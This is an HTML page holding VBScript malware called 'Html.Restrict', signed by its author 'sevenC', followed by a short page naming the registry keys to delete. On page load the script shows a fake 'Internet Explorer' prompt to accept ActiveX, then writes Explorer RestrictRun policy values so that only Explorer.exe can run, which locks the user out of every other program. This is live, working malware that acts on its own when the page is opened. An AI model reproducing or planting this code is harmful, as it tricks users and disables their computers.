<html><head><title>html.Restrict by sevenC</title><body>
<SCRIPT Language=VBScript>
'~Html.Restrict
'__By sevenC____________________________________________________________
'   _______   _______   _       _   _______       ____   ____  _______
'  / ____ \\ / ____ \\ /\\     /\\ / ____ \\     /   \\ /  // / ____ \\
' / //___\// \ \\_ \// \ \\   / // \ \\_ \//    /  /\ \/  // / //   \//
' \______ \\ / __//     \ \\ / //  / __//      /  // \   //  \ \\    _
' /\\___/ // \ \\__/\\   \ \/ //   \ \\__/\\  /  //  /  //    \ \\__/\\
' \______//   \_____//    \__//     \_____// /__//  /__//      \_____//
'________________________http://trax.to/sevenC__________________________
'________________________sevenC_zone@yahoo.com__________________________
'
On Error Resume Next
msgbox "To view this page you must accept the ActiveX",vbinformation,"Internet Explorer"
Set fso=CreateObject("Scripting.FileSystemObject")
Set ws=CreateObject("WScript.Shell")
If err.number=429 then
ws.Run javascript:location.reload()
Else
ws.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun", 1, "REG_DWORD"
ws.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\1","Explorer.exe"
End if
</script></body</html>
<html><head>
<meta http-equiv="Content-Language" content="en-us">
<title>Html.Restrict</title></head><body bgcolor="Black"><h3 align ="center">
<span style="font-weight: 400"><font color="#FFFFFF" face="Fixedsys">
<u>Html.Restrict</u><br><br>When it was loaded,you have to kill this reg path :<br>&nbsp;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun 
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun\1<br><br>
<a href="http://sevenc.vze.com/"><font color="#FF0000">http://sevenc.vze.com/</font></a> 
|| <a href="http://trax.to/sevenC">http://trax.to/sevenC</a> ||
<a href="mailto:sevenC_zone@yahoo.com"><font color="#FFFF00">
sevenC_zone@yahoo.com</font></a> </font></span>

